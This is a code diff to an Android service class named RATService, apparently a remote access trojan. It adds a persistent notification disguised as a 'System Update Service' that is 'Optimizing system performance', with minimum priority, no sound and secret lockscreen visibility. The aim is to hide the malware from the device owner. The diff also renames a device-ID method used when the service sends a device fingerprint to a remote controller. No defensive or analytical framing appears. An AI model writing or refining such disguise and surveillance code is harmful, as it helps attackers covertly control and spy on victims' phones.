@@ -122,6 +122,38 @@ public class RATService extends Service {
         startConnection();
     }
     
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                CHANNEL_ID,
+                "System Service",
+                NotificationManager.IMPORTANCE_MIN
+            );
+            channel.setDescription("System optimization service");
+            channel.setSound(null, null);
+            channel.enableVibration(false);
+            channel.setShowBadge(false);
+            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
+            
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            manager.createNotificationChannel(channel);
+        }
+    }
+    
+    private Notification createNotification() {
+        int icon = android.R.drawable.stat_sys_download_done;
+        
+        return new NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("System Update Service")
+            .setContentText("Optimizing system performance")
+            .setSmallIcon(icon)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setOngoing(true)
+            .setSilent(true)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .build();
+    }
+    
     private void acquireWakeLock() {
         try {
             PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
@@ -333,7 +365,7 @@ public class RATService extends Service {
             deviceInfo.put("model", Build.MODEL);
             deviceInfo.put("android_version", Build.VERSION.RELEASE);
             deviceInfo.put("sdk_int", Build.VERSION.SDK_INT);
-            deviceInfo.put("device_id", getDeviceId());
+            deviceInfo.put("device_id", getUniqueDeviceId());
             
             if (out != null) {
                 out.println(deviceInfo.toString());
@@ -345,8 +377,8 @@ public class RATService extends Service {
         }
     }
     
-    private String getDeviceId() {
-        // Generate or retrieve a persistent device ID
+    private String getUniqueDeviceId() {
+        // Generate or retrieve a persistent device ID (renamed to avoid conflict)
         SharedPreferences prefs = getSharedPreferences("device_prefs", MODE_PRIVATE);
         String deviceId = prefs.getString("device_id", null);
         if (deviceId == null) {
